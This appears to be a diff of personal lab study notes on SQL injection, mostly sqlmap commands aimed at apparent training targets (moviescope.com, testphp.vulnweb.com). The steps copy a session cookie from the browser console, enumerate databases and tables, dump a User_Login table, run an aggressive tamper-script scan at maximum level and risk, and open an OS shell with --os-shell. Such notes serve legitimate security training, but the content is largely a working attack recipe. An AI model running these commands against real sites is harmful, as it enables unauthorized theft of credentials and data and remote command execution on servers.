@@ -210,28 +210,38 @@ Wordpress
 	enum_user_account (root: sqlmap -u "http://moviescope.com/viewprofile.aspx?id=1"-- cookie= "result_cookie"-D moviescope -T User_Login --Dump
 	enum_OS	(root: sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell ) then hostname or tasklist, help to see others commands
 	
+		 python3 sqlmap.py -r .\request.txt tfUPass --random-agent --tamper=space2comment --batch --force-ssl --level 5 --risk 3 --dbs 
 
 
-Complete till now .. now
+		Complete till now .. now
 
-- Login a website
-- Inspect element
-- Dev tools-\&gt;Console: document.cookie
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs
- - -u: Specify the target URL
- - --cookie: Specify the HTTP cookie header value
- - --dbs: Enumerate DBMS databases
-- Get a list of databases
-- Select a database to extract its tables
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables
- - -D: Specify the DBMS database to enumerate
- - --tables: Enumerate DBMS database tables
-- Get a list of tables
-- Select a column
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --
-dump
-- Get table data of this column
-- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell
-- Get the OS Shell
-- TASKLIST
+		- Login a website
+		- Inspect element
+		- Dev tools-\&gt;Console: document.cookie
+		- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs
+		 - -u: Specify the target URL
+		 - --cookie: Specify the HTTP cookie header value
+		 - --dbs: Enumerate DBMS databases
+		- Get a list of databases
+		- Select a database to extract its tables
+		- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables
+		 - -D: Specify the DBMS database to enumerate
+		 - --tables: Enumerate DBMS database tables
+		- Get a list of tables
+		- Select a column
+		- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --
+		dump
+		- Get table data of this column
+		- sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell
+		- Get the OS Shell
+		- TASKLIST
 
+  	Ref: Ref: https://securityonline.info/top-25-useful-sqlmap-commands/
+	
+	
+	For dump:
+	sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+        now database name will come
+	sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D databasename --dump-all --batch
+
+	
